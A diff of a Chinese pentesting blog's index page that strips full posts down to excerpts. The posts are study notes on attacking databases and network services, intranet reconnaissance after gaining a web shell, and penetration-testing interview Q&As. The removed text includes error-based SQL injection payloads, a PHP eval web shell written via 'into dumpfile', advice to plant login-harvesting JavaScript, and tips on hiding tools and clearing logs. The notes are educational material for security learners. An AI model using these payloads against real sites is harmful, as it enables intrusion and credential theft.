-<pre><code>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。
-• 默认端口：5432
-• 攻击方法：
-• 爆破：弱口令：postgres postgres
-• 缓冲区溢出：CVE-2014-2669
-• 参考：
-• http://drops.xmd5.com/static/drops/tips-6449.html
-•https://www.secpulse.com/archives/69153.html
-</pre></code>
-
-<p>MongoDB数据库</p>
-<pre><code>MongoDB，NoSQL数据库；攻击方法与其他数据库类似》
-• 默认端口：27017
-• 攻击方法：
-• 爆破：弱口令
-• 未授权访问；github有攻击代码；请点击
-• 参考：
-• http://www.cnblogs.com/LittleHann/p/6252421.html
-•http://www.tiejiang.org/19157.html</pre></code>
-
-<p>Redis数据库</p>
-<pre><code>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。
-• 攻击方法：
-• 爆破：弱口令
-• 未授权访问+配合ssh key提权；
-• 参考：
-•http://www.alloyteam.com/2017/07/12910/</pre></code>
-
-<p>SysBase数据库</p>
-<pre><code>• 默认端口：服务端口5000；监听端口4100；备份端口：4200
-• 攻击方法：
-• 爆破：弱口令
-•命令注入：</pre></code>
-
-<p>DB2 数据库</p>
-<pre><code>• 默认端口：5000
-• 攻击方法：
-• 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）
-• 参考：
-•http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071</pre></code>
-
-<p>FTP 服务</p>
-<pre><code>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等； 默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）
-• 攻击方式：
-• 爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；
-• 匿名访问：用户名：anonymous 密码：为空或任意邮箱
-• 嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）
-• 后门 vsftp
-• 远程溢出
-• 跳转攻击</pre></code>
-<p>NFS 服务</p>
-<pre><code>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。
-• 攻击方法
-• 未授权访问
-• 参考
-• http://www.freebuf.com/articles/network/159468.html
-• http://www.vuln.cn/6368</pre></code>
-<p>Samba服务</p>
-<pre><code>Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。
-• 攻击方法
-• 远程代码执行
-• 弱口令
-• 未授权访问（public）
-• 参考
-• http://www.91ri.org/17114.html</pre></code>
-<p>SSH 服务</p>
-<pre><code>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。
-• 端口：22
-• 攻击方法：
-• 爆破
-• 后门
-• 漏洞：28退格漏洞、OpenSSL漏洞
-• 参考
-• https://cloud.tencent.com/developer/article/1078187</pre></code>
-<p>Telnet 服务</p>
-<pre><code>Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在終端使用者的电脑上使用telnet程序，用它连接到服务器。終端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。
-• 默认端口：21
-• 攻击方法：
-• 爆破
-• 嗅探</pre></code>
-<p>Windows 远程连接</p>
-<pre><code>• 默认端口：3389
-• 攻击方法
-• 爆破
-• Shift粘滞键后门：5次shift后门
-• 利用ms12-020攻击3389端口</pre></code>
-<p>VNC服务</p>
-<pre><code>VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。
-• 默认端口：5900+桌面ID（5901；5902）
-• 攻击方式：
-• 爆破：弱口令
-• 认证口令绕过：
-• 拒绝服务攻击：（CVE-2015-5239）
-• 权限提升：（CVE-2013-6886）</pre></code>
-<p>SMTP协议</p>
-<pre><code>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！
-• 默认端口：25（smtp）、465（smtps）
-• 攻击方式：
-• 爆破：弱口令
-• 未授权访问</pre></code>
-<p>POP3协议</p>
-<pre><code>• 默认端口：109（POP2）、110（POP3）、995（POP3S）
-• 攻击方式：
-• 爆破；弱口令
-• 未授权访问；</pre></code>
-<p>DNS服务</p>
-<pre><code>• 默认端口：53
-• 攻击方式：
-• 区域传输漏洞</pre></code>
-<p>IMAP协议</p>
-<pre><code>• 默认端口：143（imap）、993（imaps）
-• 攻击方式：
-• 爆破：弱口令
-• 配置不当</pre></code>
-<p>SNMP协议</p>
-<pre><code>• 默认端口：161
-• 攻击方式:
-• 爆破：弱口令</pre></code>
-<p>DHCP服务</p>
-<pre><code>• 默认端口：67&68、546（DHCP Failover做双机热备的）
-• 攻击方式：
-DHCP劫持；</pre></code>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+•https://xz.aliyun.com/t/1491</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/11/20/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1-%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -919,47 +576,20 @@ DHCP劫持；</pre></code>
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>一、通过常规web渗透拿到webshell后，那么接下来最重要的就是探测系统信息，提权，针对windows想办法开启远程桌面连接，针对linux想办法反弹shell本地连接</p>
-<pre><code>1、whomai 查看当前权限，若权限低，提权
+          <p>一、通过常规web渗透拿到webshell后，那么接下来最重要的就是探测系统信息，提权，针对windows想办法开启远程桌面连接，针对linux想办法反弹shell本地连接</p><pre><code>1、whomai 查看当前权限，若权限低，提权
 2、systeminfo 查看系统版本、域、补丁情况，根据相关补丁对应的提权工具进行相对应提权
 3、ps liunx查看进程
 tasklist win查看进程
 tasklist /f /im pid 杀进程（常用于杀软）
-提权部分另外介绍</pre></code>
-<p><img src="/images/pasted-44.png" alt="upload successful"></p>
-<p>二、信息搜集(拿到一台服务器的时候，拿下内网更多服务器，获取更有用的信息)</p>
-<pre><code><center>信息获取</center>
-1、可以使用pwddump来抓取管理员hash，配合彩虹表或者在线hash表破解，获得管理员明文密码，这个可以作为自己的密码表，在其他内网机器上登陆尝试
-2、查看远程桌面的连接信息，一般通过远程桌面经常连接的机器会在该程序打开时候的下拉菜单中保存，如果管理员选择的是记住密码的话，那么就轻松跳转其他机器
-3、假如存在数据库管理工具，ftp管理工具等，如navicat、secure CRT、flashfxp等，查看是否保存的密码，尝试登陆
-4、各种浏览器保存的登录密码，作为自己的密码表，在其他内网机器上登录尝试
-5、有无vpn连接信息
-</pre></code>
-
-<pre><code><center>存活主机扫描</center>
-1、ipconfig/all
-2、arp -a 查看下arp缓存，是否有相邻IP或网段（在windows或者linux中都可以快速的获取存活的设备
-ip地址以及网关地址）
-扫描工具扫描存活主机（可反弹shell到msf，设置路由表，利用msf内置扫描模块扫描use auxiliary / scanner / portscan / tcp
-run get_local_subnets    获取当前网段
-run  autoroute -s 192.168.100.0/24  添加路由
-run autoroute -p    路由查询）
-3、通过上传一些工具，如cain，可以探测本地程序缓存的密码，通过嗅探器可嗅探到相邻机器的username和password
-4、通过上传一些工具，如hscan，可以探测到同一个段内存活的机器IP、端口、服务等信息，包括存活机器的弱口令
-控制发包量，内网防范严谨的时候，容易触发报警警告
-</pre></code>
-<pre><code><center>存活端口扫描利用</center>
-1、服务弱口令
-2、直接利用msf(可反弹shell到msf，设置路由表，利用msf内置扫描模块扫描use auxiliary / scanner / portscan / tcp)
-3、未经授权的各种服务
-4、如web渗透一样，在进行端口/服务探测时，可以探测到服务版本信息，根据已知漏洞msf溢出攻击，拿到对应服务器权限
-</pre></code>
-<pre><code>net user /domain 查看域用户
-net view 显示正由指定的计算机共享的域、计算机或资源的列表。如果在没有参数的情况下使用，则net view显示当前域中的计算机列表
-net view /domain 查看几个域
-net group /domain 查看域里面的组
-
-</pre></code>
+提权部分另外介绍</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/11/19/%E4%BB%8Ewebshell%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1034,8 +664,7 @@ net group /domain 查看域里面的组
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>1.拿到一个待检测的站，你觉得应该先做什么？</p>
-<pre><code>1)信息收集
+          <p>1.拿到一个待检测的站，你觉得应该先做什么？</p><pre><code>1)信息收集
     1，获取域名的whois信息,获取注册者邮箱姓名电话等。
     2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。
     3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞
@@ -1050,270 +679,15 @@ net group /domain 查看域里面的组
 4）权限提升
     提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权
 5) 日志清理
-6）总结报告及修复方案</pre></code>
-
-<p>2.判断出网站的CMS对渗透有什么意义？</p>
-<pre><code>查找网上已曝光的程序漏洞。
-如果开源，还能下载相对应的源码进行代码审计。</pre></code>
-
-<p>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</p>
-<pre><code>敏感文件、二级目录扫描
-站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</pre></code>
-
-<p>4.常见的网站服务器容器。</p>
-<pre><code>IIS、Apache、nginx、Lighttpd、Tomcat</pre></code>
-
-<p>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</p>
-<pre><code>root权限以及网站的绝对路径。</pre></code>
-
-<p>6.目前已知哪些版本的容器有解析漏洞，具体举例。</p>
-<pre><code>IIS 6.0
-/xx.asp/xx.jpg "xx.asp"是文件夹名
-IIS 7.0/7.5
-默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析
-Nginx
-版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。
-空字节代码 xxx.jpg.php
-Apache
-上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀
-lighttpd
-xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！</pre></code>
-
-<p>7.如何手工快速判断目标站是windows还是linux服务器？</p>
-<pre><code>linux大小写敏感,windows大小写不敏感。</pre></code>
-
-<p>8.为何一个mysql数据库的站，只有一个80端口开放？</p>
-<pre><code>更改了端口，没有扫描出来。
-站库分离。
-3306端口不对外开放</pre></code>
-
-<p>9、3389无法连接的几种情况</p>
-<pre><code>没开放3389 端口
-端口被修改
-防护拦截
-处于内网(需进行端口转发)</pre></code>
-
-<p>10.如何突破注入时字符被转义？</p>
-<pre><code>宽字符注入
-hex编码绕过</pre></code>
-
-<p>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</p>
-<pre><code>查看编辑器的名称版本,然后搜索公开的漏洞。</pre></code>
-
-<p>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</p>
-<pre><code>能做的事情很多，用隐藏网马来举例子：
-插入
-![upload successful](/images/pasted-43.png)
-文件会被解析成.php文件。
-具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</pre></code>
-
-<p>13.注入漏洞只能查账号密码？</p>
-<pre><code>只要权限广，拖库脱到老。</pre></code>
-
-<p>14.安全狗会追踪变量，从而发现出是一句话木马吗？</p>
-<pre><code>是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</pre></code>
-
-<p>15.access 扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？</p>
-<pre><code>迅雷下载，直接改后缀为.mdb。</pre></code>
-
-<p>16.提权时选择可读写目录，为何尽量不用带空格的目录？</p>
-<pre><code>因为exp执行多半需要空格界定参数</pre></code>
-
-<p>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</p>
-<pre><code>同数据库。</pre></code>
-
-<p>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</p>
-<pre><code>and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</pre></code>
-
-<p>19:某个防注入系统，在注入时会提示：</p>
-<pre><code>系统检测到你有非法注入的行为。
-已记录您的ip xx.xx.xx.xx
-时间:2016:01-23
-提交页面:test.asp?id=15
-提交内容:and 1=1</pre></code>
-
-<p>20、如何利用这个防注入系统拿shell？</p>
-<pre><code>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：http://ytxiao.lofter.com/post/40583a_ab36540。</pre></code>
-
-<p>21.上传大马后访问乱码时，有哪些解决办法？</p>
-<pre><code>浏览器中改编码。</pre></code>
-
-<p>22.审查上传点的元素有什么意义？</p>
-<pre><code>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</pre></code>
-
-<p>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</p>
-<pre><code>先爆破用户名，再利用被爆破出来的用户名爆破密码。
-其实有些站点，在登陆处也会这样提示
-所有和数据库有交互的地方都有可能有注入。</pre></code>
-
-<p>24.目标站发现某txt的下载地址为<a href="http://www.test.com/down/down.php?file=/upwdown/1.txt，你" target="_blank" rel="noopener">http://www.test.com/down/down.php?file=/upwdown/1.txt，你</a><pre><code>有什么思路？<br>这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</pre></code></p>
-<p>25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</p>
-<pre><code>直接在网站二级目录/abc/下扫描敏感文件及目录。</pre></code>
-
-<p>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</p>
-<pre><code>后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。
-在登录后才可以访问的文件中插入XSS脚本。</pre></code>
-
-<p>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</p>
-<pre><code>审查元素 把密码处的password属性改成text就明文显示了</pre></code>
-
-<p>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</p>
-<pre><code>原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</pre></code>
-
-<p>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</p>
-<pre><code>在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到<hws>内容<hws>。</pre></code>
-
-<p>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</p>
-<pre><code>隐藏文件夹，为了不让管理员发现你传上去的工具。</pre></code>
-
-<p>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</p>
-<pre><code>A. demo.jsp?id=2+1 B. demo.jsp?id=2-1
-选B，在 URL 编码中 + 代表空格，可能会造成混淆</pre></code>
-
-<p>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</p>
-<pre><code>demo.do?DATA=AjAxNg==
-DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</pre></code>
-
-<p>33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</p>
-<pre><code>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell
-使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高
-通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</pre></code>
-
-<p>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</p>
-<pre><code>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。
-CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer
-XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</pre></code>
-
-<p>35、CSRF、SSRF和重放攻击有什么区别？</p>
-<pre><code>CSRF是跨站请求伪造攻击，由客户端发起
-SSRF是服务器端请求伪造，由服务器发起
-重放攻击是将截获的数据包进行重放，达到身份认证等目的</pre></code>
-
-<p>36、说出至少三种业务逻辑漏洞，以及修复方式？</p>
-<pre><code>密码找回漏洞中存在
-
-1）密码允许暴力破解、
-
-2）存在通用型找回凭证、
-
-3）可以跳过验证步骤、
-
-4）找回凭证可以拦包获取
-
-等方式来通过厂商提供的密码找回功能来得到密码。
-身份认证漏洞中最常见的是
-
-1）会话固定攻击
-
-2） Cookie 仿冒
-
-只要得到 Session 或 Cookie 即可伪造用户身份。
-验证码漏洞中存在
-
-1）验证码允许暴力破解
-
-2）验证码可以通过 Javascript 或者改包的方法来进行绕过</pre></code>
-
-<p>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</p>
-<pre><code>get /ecskins/demo.jsp?uid=2016031900&keyword=”hello world”
-HTTP/1.1Host:***.com:82User-Agent:Mozilla/
-5.0 Firefox/40Accept:text/css,/;q=0.1
-Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3
-Referer:http://*******.com/eciop/orderForCC/
-cgtListForCC.htm?zone=11370601&v=145902
-Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;
-uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;
-st_uid=N90PLYHLZGJXI-NX01VPUF46W;
-status=True
-Connection:keep-alive</pre></code>
-
-<p>38、给你一个网站你是如何来渗透测试的?</p>
-<pre><code>在获取书面授权的前提下。</pre></code>
-
-<p>39、sqlmap，怎么对一个注入点注入？</p>
-<pre><code>1）如果是get型号，直接，sqlmap -u "诸如点网址".
-2) 如果是post型诸如点，可以sqlmap -u "注入点网址” --data="post的参数"
-3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r "文件地址"</pre></code>
-
-<p>40、nmap，扫描的几种方式</p>
-<p>41、sql注入的几种类型？</p>
-<pre><code>1）报错注入
-2）bool型注入
-3）延时注入
-4）宽字节注入</pre></code>
-<p>42、报错注入的函数有哪些？ 10个</p>
-<pre><code>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】----------------
-2）通过floor报错 向下取整
-3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)
-4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));
-5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));
-6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));
-7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));
-8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));
-9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));
-10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</pre></code>
-
-<p>43、延时注入如何来判断？</p>
-<pre><code>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</pre></code>
-
-<p>44、盲注和延时注入的共同点？</p>
-<pre><code>都是一个字符一个字符的判断</pre></code>
-
-<p>45、如何拿一个网站的webshell？</p>
-<pre><code>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，
-一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</pre></code>
-
-<p>46、sql注入写文件都有哪些函数？</p>
-<pre><code>select '一句话' into outfile '路径'
-select '一句话' into dumpfile '路径'
-select '<?php eval($_POST[1]) ?>' into dumpfile 'd:\wwwroot\baidu.com\nvhack.php';</pre></code>
-
-<p>47、如何防止CSRF?</p>
-<pre><code>1,验证referer
-2，验证token
-详细：http://cnodejs.org/topic/5533dd6e9138f09b629674fd</pre></code>
-
-<p>48、owasp 漏洞都有哪些？</p>
-<pre><code>1、SQL注入防护方法：
-2、失效的身份认证和会话管理
-3、跨站脚本攻击XSS
-4、直接引用不安全的对象
-5、安全配置错误
-6、敏感信息泄露
-7、缺少功能级的访问控制
-8、跨站请求伪造CSRF
-9、使用含有已知漏洞的组件
-10、未验证的重定向和转发</pre></code>
-
-<p>49、SQL注入防护方法？</p>
-<pre><code>1、使用安全的API
-2、对输入的特殊字符进行Escape转义处理
-3、使用白名单来规范化输入验证方法
-4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符
-5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</pre></code>
-
-<p>50、代码执行，文件读取，命令执行的函数都有哪些？</p>
-<pre><code>1）代码执行：
-
-eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function
-
-2）文件读取：
-
-file_get_contents(),highlight_file(),fopen(),read
-
-file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等
-3)命令执行：
-
-system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</pre></code>
-
-<p>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</p>
-<pre><code>src指定一个远程的脚本文件，获取referer</pre></code>
-
-<p>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</p>
-<pre><code>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析
-AddType application/x-httpd-php .jpg
-![upload successful](/images/pasted-42.png)
-会以php方式来解析</pre></code>
+6）总结报告及修复方案</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/11/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1444,7 +818,7 @@ AddType application/x-httpd-php .jpg
 53. 关键字： Powered by:94KKBBS 2005 利用密码找回功能 找回 admin 提问:ddddd 回答:ddddd
 54. 关键字:****** inurl:readnews.asp 把最后一个 /改成%5c ,直接暴库,看密码,进后台随便添加个新闻 在标题输入我们的一句话木马
 55. 工具:一句话木马 BBsXp 5.0 sp1 管理员猜解器关键词:powered by bbsxp5.00 进后台,备份一句话马!
-56. 关键字：程序核心： BJXSHOP 网上开店专家 后台:/admin
+56. 关键字：程序核心： BJXSHOP 网上开店专家 后台:/admin</code></pre>
       
     </div>
 
@@ -1531,75 +905,15 @@ AddType application/x-httpd-php .jpg
 • 测试是发现问题就算成功，还是尽可能的发现多的问题？
 • 渗透过程是否需要考虑社会工程？
 3）确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？
-根据需求和自己技术能力来确定能不能做、能做多少</pre></code>
-
-<pre><code>2.分析风险，获得授权
-分析渗透测试过程中可能产生的风险，如大量测试数据的处理、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本...
-由测试方书写实施方案初稿并提交给客户（or本公司内部领导）进行审核。在审核完成后，从客户（or本公司内部领导）获取对测试方进行书面委托授权书，授权测试方进行渗透测试。</pre></code>
-
-<pre><code>3.信息收集
-在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。
-方式：主动扫描；开放搜索
-开放搜索：利用搜索引擎获得后台、未授权页面、敏感url
-基础信息：IP，网段，域名，端口
-系统信息：操作系统版本
-应用信息：各端口的应用，例如web应用，邮件应用等
-版本信息：所有探测到的版本
-服务信息：服务器类型、版本
-人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等
-防护信息：试着看能否探测到防护设备</pre></code>
-
-<p>4.漏洞探测（手动&amp;自动）</p>
-<pre><code>利用上一步中列出的信息，使用相应的漏洞检测
-方法：
-1）漏扫：AWVS、AppScan...
-2）结合漏洞去exploit-db等位置找利用
-3）在网上寻找验证POC
-内容：
-系统漏洞：系统没有及时打补丁
-Websever漏洞：Websever配置问题
-Web应用漏洞：Web应用开发问题
-其它端口服务漏洞：各种21/8080(st2)/7001/22/3389
-通信安全：明文传输，token在cookie中传送等</pre></code>
-
-<p>5.漏洞验证</p>
-<pre><code>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验，成功后再应用于目标中。
-• 自动化验证：结合自动化扫描工具提供的结果
-• 手工验证：根据公开资源进行验证
-• 试验验证：自己搭建模拟环境进行验证
-• 登录猜解：有时可以尝试猜解一下登陆口的账号密码等信息
-• 业务漏洞验证：如发现业务漏洞，要进行验证
-• 公开资源的利用
-exploit-db/wooyun/
-渗透代码网站
-通用、缺省口令
-厂商的漏洞警告等</pre></code>
-
-<p>6.信息分析</p>
-<pre><code>为下一步实施渗透做准备
-• 精准攻击：准备好上一步探测到的漏洞exp（漏洞利用），用来精准攻击
-• 绕过防御机制：是否有防火墙等设备，如何绕过
-• 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标
-• 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）
-• 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</pre></code>
-
-<p>7.利用漏洞，获取数据</p>
-<pre><code>• 实施攻击：根据前几步的结果，进行攻击
-• 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）
-• 进一步渗透：内网入侵，敏感目标
-• 持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等
-• 清理痕迹：清理相关日志（访问，操作），上传文件等</pre></code>
-
-<p>8.信息整理</p>
-<pre><code>• 整理渗透工具：整理渗透过程中用到的代码，poc，exp等
-• 整理收集信息：整理渗透过程中收集到的一切信息
-• 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息
-目的：为了最后形成报告，形成测试结果使用。</pre></code>
-
-<p>9.形成报告</p>
-<pre><code>• 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告
-• 补充介绍：要对漏洞成因，验证过程和带来危害进行分析
-修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</pre></code>
+根据需求和自己技术能力来确定能不能做、能做多少</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/11/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1674,62 +988,15 @@ exploit-db/wooyun/
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>仅知道靶机的ip是172.16.12.131，现在需要一步步去获取更多的信息。</p>
-<p>一、获取靶机的登录权限：<br>1、探测靶机开放端口：</p>
-<p><img src="/images/pasted-4.png" alt="upload successful"><br>发现1433端口开放。1433对应mssqlserver数据库服务。</p>
-<p>2、继续探测非默认服务端口，发现27689端口对外开放</p>
-<p><img src="/images/pasted-5.png" alt="upload successful"></p>
-<p>3、尝试用浏览器访问，发现是web服务端口，打开网页如下：</p>
-<p><img src="/images/pasted-7.png" alt="upload successful"></p>
-<p>4、可以尝试暴力破解用户名和密码，或者尝试用后台扫描工具扫描网站。暴力破解费时费力，成功率不高，所以优先扫描网站后台：</p>
-<p><img src="/images/pasted-8.png" alt="upload successful"></p>
-<p>检查发现的后台文件，发现robots.txt文件，双击打开<a href="http://172.16.12.131:27689/robots.txt" target="_blank" rel="noopener">http://172.16.12.131:27689/robots.txt</a><br>内容如下：<br><img src="/images/pasted-9.png" alt="upload successful"></p>
-<p>5、从robots.txt发现2个aspx页面，访问其中file_down.aspx页面如下：</p>
-<p><img src="/images/pasted-10.png" alt="upload successful"></p>
